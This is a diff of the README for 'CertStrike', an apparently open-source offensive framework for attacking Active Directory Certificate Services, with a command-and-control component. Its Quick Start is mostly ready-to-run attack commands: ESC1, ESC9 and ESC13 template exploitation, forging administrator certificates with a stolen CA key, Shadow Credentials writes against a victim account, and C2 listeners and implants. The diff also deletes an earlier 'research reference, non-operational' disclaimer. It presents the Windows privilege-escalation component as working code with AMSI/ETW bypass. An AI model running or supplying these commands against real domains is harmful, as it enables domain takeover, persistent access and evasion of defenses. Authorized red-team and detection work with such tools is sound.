@@ -1,68 +1,41 @@
 # CertStrike
 
-ADCS exploitation and PKI attack framework with integrated cert-auth C2.
+ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.
 
 ## Features
 
 ### ADCS / PKI Exploitation
-- **Native LDAP enumeration** of certificate templates (no ldapsearch binary dependency)
-- **ESC1-ESC4 vulnerability detection** with automatic scoring (ESC4 performs full ACE parsing to identify non-privileged trustees with dangerous write access)
-- **ESC1 exploitation**: forge certificates with arbitrary UPN via misconfigured templates
-- **ESC4 exploitation**: modify template ACLs → exploit as ESC1 → auto-restore
-- **Attack chain auto-detection**: scan all templates, score vulnerabilities, output prioritized attack paths
-- **Golden certificate forging** with UPN SAN for smart card / Kerberos PKINIT authentication
+- **ESC1-ESC5** vulnerability detection with automatic scoring and exploitation
+- **ESC8** HTTP web enrollment relay detection (NTLM probing)
+- **ESC9** CT_FLAG_NO_SECURITY_EXTENSION detection and UPN swap exploitation
+- **ESC10** Weak certificate mapping detection (CertificateMappingMethods)
+- **ESC11** RPC interface encryption enforcement detection
+- **ESC13** OID group link abuse via msDS-OIDToGroupLink
+- **ESC14** Weak explicit mappings via altSecurityIdentities
+- **ESC4 full ACE parsing** — identifies non-privileged trustees with WriteDACL/WriteOwner
+- **Golden certificate forging** — sign certs with extracted CA key for persistent domain access
+- **Shadow Credentials** — msDS-KeyCredentialLink attacks for PKINIT without a CA
+- **Attack chain auto-detection** — enumerate, score, prioritize across all ESC paths
+- Native LDAP enumeration (no ldapsearch dependency)
 
 ### C2 Framework
-- HTTP/HTTPS listeners with auto-generated self-signed TLS certificates
-- Implant session management: registration, polling, command queue, result collection
-- **Certificate persistence**: cert-auth implants authenticate via forged certificates (Schannel mTLS)
-- Stager configuration generation
+- HTTP/HTTPS listeners with auto-generated TLS certificates
+- Session management: registration, polling, command queue, result collection
+- **Certificate persistence**: cert-auth implants via forged certificates (Schannel mTLS)
+- **Polling agent**: `certstrike agent --config stager.json`
+- Stager and cert-auth implant configuration generation
 
-### MCP Server
-5 tools for agentic integration: `pki_enumerate`, `pki_forge`, `c2_list_sessions`, `c2_queue_command`, `c2_get_results`
+### SmartPotato — Windows Privilege Escalation
+Unified potato toolkit (JuicyPotato, RoguePotato, SweetPotato/PrintSpoofer) with real Windows implementations using `golang.org/x/sys/windows`. Named pipe impersonation, token duplication, AMSI/ETW bypass. Cross-compiles for Windows from Linux.
 
-### Operator Console
-Bubbletea-based TUI with views: Sessions, Commands, Listeners, Implants. Starts empty, populated by live C2 sessions.
-
-**Starting a demo/test session to see the TUI in action:**
-```bash
-# Terminal 1: start a C2 listener
-./certstrike c2 --port 8443 --protocol https
-
-# Terminal 2: launch the operator console
-./certstrike console
-
-# Terminal 3: simulate an implant check-in (curl the registration endpoint)
-curl -k -X POST https://localhost:8443/register \
-  -H 'Content-Type: application/json' \
-  -d '{"hostname":"demo-host","username":"testuser","os":"linux","arch":"amd64","pid":12345}'
-# The Sessions tab in the console will populate once the implant checks in.
-```
-
-### SmartPotato *(Research Reference)*
-Windows privilege escalation reference documenting JuicyPotato, RoguePotato, SweetPotato attack chains. Outputs technique descriptions and COM flow diagrams. Does not execute real privilege escalation — requires Windows syscall bindings to become operational.
-
-## Operational vs Research-Only Components
-
-| Component | Status | Notes |
-|-----------|--------|-------|
-| ADCS enumeration (`pki --enum`) | **Operational** | Native LDAP, no external deps |
-| ESC1/ESC4 exploitation | **Operational** | Live LDAP writes; requires WriteDacl for ESC4 |
-| Certificate forging | **Operational** | Pure Go, CGO_ENABLED=0 |
-| C2 listener + session management | **Operational** | HTTP/HTTPS, cert-auth implants |
-| MCP server (6 tools) | **Operational** | stdio JSON-RPC |
-| Operator console (TUI) | **Operational** | Requires live C2 sessions to show data; see below |
-| C2 polling agent | **Operational** | `certstrike agent --config stager.json` |
-| SmartPotato (Windows privesc) | **Research Reference** | Technique documentation for detection engineering — see below |
-| Zero-click simulation | **Research Reference** | Attack chain documentation only — see below |
-
-### SmartPotato — Research Reference (Non-Operational)
-
-`implants/smartpotato/` documents JuicyPotato, RoguePotato, and SweetPotato Windows privilege
-escalation techniques. It **does not execute real privilege escalation**. On non-Windows platforms it
-prints the COM/RPC flow for detection engineering purposes. The absence of Windows syscall bindings
-(`golang.org/x/sys/windows`) is a deliberate design decision, not a TODO — this is a technique
-reference for understanding and detecting potato-family attacks.
+### Operational Tooling
+- **Engagement reporting** — `certstrike pki --report --format markdown`
+- **JSON output** — `--json` flag for pipeline integration
+- **PFX import/export** — load and inspect PKCS12 files
+- **Stealth mode** — `--stealth` for jittered LDAP queries
+- **LDAPS/StartTLS** — encrypted LDAP connections
+- **MCP server** — 5 tools for agentic integration
+- **TUI operator console** — Bubbletea-based session management
 
 ## Quick Start
 
@@ -70,44 +43,72 @@ reference for understanding and detecting potato-family attacks.
 # Build
 CGO_ENABLED=0 go build -o certstrike ./cmd/certstrike
 
-# Enumerate ADCS templates
-./certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --username user --password pass
+# Build SmartPotato for Windows
+cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
 
-# Auto-detect ESC vulnerabilities
-./certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local --username user --password pass
+# Enumerate all ESC vulnerabilities
+./certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass
+
+# JSON output for pipeline integration
+./certstrike pki --enum --json --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
 # Exploit ESC1
-./certstrike pki --exploit esc1 --template VulnTemplate --upn administrator@corp.local \
-  --target-dc dc01.corp.local --domain corp.local --username user --password pass
+./certstrike pki --exploit esc1 --template VulnTemplate --upn admin@corp.local \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# Forge golden certificate
-./certstrike pki --forge --upn admin@corp.local --output admin.pem
+# Exploit ESC9 (UPN swap)
+./certstrike pki --exploit esc9 --template NoSecExt --upn admin@corp.local \
+  --attacker-dn "CN=attacker,CN=Users,DC=corp,DC=local" \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# Start C2 listener
+# Exploit ESC13 (OID group link)
+./certstrike pki --exploit esc13 --template LinkedPolicy --upn admin@corp.local \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+
+# Forge golden certificate (with extracted CA key)
+./certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt --output admin.pem
+
+# Shadow Credentials
+./certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+./certstrike shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+./certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" --device-id <guid> \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+
+# Generate engagement report
+./certstrike pki --report --format markdown --output findings.md \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+
+# C2 listener
 ./certstrike c2 --port 8443 --protocol https
 
-# Generate cert-auth implant
-./certstrike c2 --implant-type cert-auth --upn admin@corp.local --c2-url https://c2:8443
+# C2 polling agent
+./certstrike agent --config stager.json
 
-# Launch operator console
+# Import and inspect PFX
+./certstrike pki --import-pfx cert.pfx --pfx-password pass
+
+# Stealth mode with LDAPS
+./certstrike pki --enum --stealth --ldaps --target-dc dc01.corp.local --domain corp.local -u user -p pass
+
+# Operator console
 ./certstrike console
 
-# Start MCP server
+# MCP server
 ./certstrike mcp
-
-# Run C2 polling agent
-./certstrike agent --config stager.json
 ```
 
 ## Architecture
 
 ```
-cmd/certstrike/     CLI entry points (cobra)
-pkg/pki/            ADCS enumeration, ESC exploitation, certificate forging
-pkg/c2/             C2 listener, session management, cert-auth implants
-internal/mcp/       MCP stdio server (5 tools)
-internal/tui/       Bubbletea operator console
-implants/smartpotato/ Windows privilege escalation
+cmd/certstrike/         CLI entry points (cobra)
+pkg/pki/                ADCS enumeration, ESC1-14 exploitation, certificate forging,
+                        shadow credentials, reporting, PFX handling
+pkg/c2/                 C2 listener, session management, cert-auth implants, polling agent
+internal/mcp/           MCP stdio server (5 tools)
+internal/tui/           Bubbletea operator console
+implants/smartpotato/   Windows potato privilege escalation (build with GOOS=windows)
 ```
 
 ## Dependencies
@@ -116,3 +117,4 @@ All pure Go, CGO_ENABLED=0 compatible:
 - `github.com/go-ldap/ldap/v3` — Native LDAP client
 - `github.com/charmbracelet/bubbletea` — TUI framework
 - `github.com/charmbracelet/lipgloss` — TUI styling
+- `software.sslmate.com/src/go-pkcs12` — PKCS12/PFX handling
